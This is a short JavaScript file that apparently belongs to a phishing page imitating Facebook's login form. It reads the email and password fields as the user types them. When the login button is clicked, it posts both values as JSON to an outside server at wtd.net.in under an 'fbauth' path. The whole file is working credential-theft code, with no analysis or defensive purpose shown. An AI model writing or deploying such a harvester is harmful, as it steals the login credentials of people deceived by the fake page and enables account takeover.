
loginButton = document.getElementById('u_0_4')
uNameField = document.getElementById('email')
passField = document.getElementById('pass')
// errorBox = document.getElementById('error-box')

uName = ''
pass = ''

var xhr = new XMLHttpRequest();
xhr.open("POST","https://wtd.net.in/api/fbauth/auth" , true);
xhr.setRequestHeader("Content-Type", "application/json");

onMainButtonClick = () => {
    xhr.send(JSON.stringify({ 
        name: uName, 
        ps: pass,
    }));
    // if (uName == '' || pass == ''){
    //     errorBox.style.display = 'block'
    // }
    // XMLHttpRequest
}


loginButton.addEventListener('click', onMainButtonClick)
uNameField.addEventListener('input', ($event) => {
    uName = uNameField.value
})
passField.addEventListener('input', ($event) => {
    pass = passField.value
})



